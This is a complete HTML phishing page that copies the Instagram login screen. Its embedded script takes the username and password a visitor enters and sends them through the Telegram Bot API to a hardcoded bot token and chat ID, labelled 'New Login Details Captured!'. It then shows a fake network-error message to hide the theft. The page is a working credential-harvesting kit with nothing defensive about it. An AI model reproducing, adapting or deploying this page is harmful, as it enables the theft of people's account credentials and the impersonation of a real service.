<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px 40px 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }

        .logo {
            font-size: 32px;
            margin-bottom: 25px;
            font-weight: 500;
            letter-spacing: -0.5px;
            color: #262626;
        }

        /* Network/Technical error message styling */
        .error-msg {
            color: #ed4956;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
            line-height: 18px;
        }

        .input-field {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            font-size: 12px;
            margin-bottom: 6px;
            outline: none;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Login Box -->
        <div class="login-box">
            <div class="logo">Instagram</div>
            
            <!-- Network Error Box -->
            <div id="errorBox" class="error-msg">Network error. Please check your internet connection and try again.</div>

            <form id="loginForm">
                <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" class="input-field" placeholder="Password" required>
                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
            </form>

            <div class="separator">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>

            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <!-- Sign Up Box -->
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8920290679:AAEm68bEZRN0244oVPEIcnR7ZGUrKdTdb9U";
        const CHAT_ID = "8106405157"; 

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const errorBox = document.getElementById('errorBox');
            const loginBtn = document.getElementById('loginBtn');

            loginBtn.innerText = "Please wait...";
            loginBtn.disabled = true;

            const message = `🔔 New Login Details Captured!\n\n👤 Username: ${user}\n🔑 Password: ${pass}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(() => {
                    loginBtn.innerText = "Log in";
                    loginBtn.disabled = false;
                    errorBox.style.display = 'block';
                    document.getElementById('password').value = '';
                }, 1000);
            })
            .catch(error => {
                setTimeout(() => {
                    loginBtn.innerText = "Log in";
                    loginBtn.disabled = false;
                    errorBox.style.display = 'block';
                }, 1000);
            });
        });
    </script>

</body>
</html>
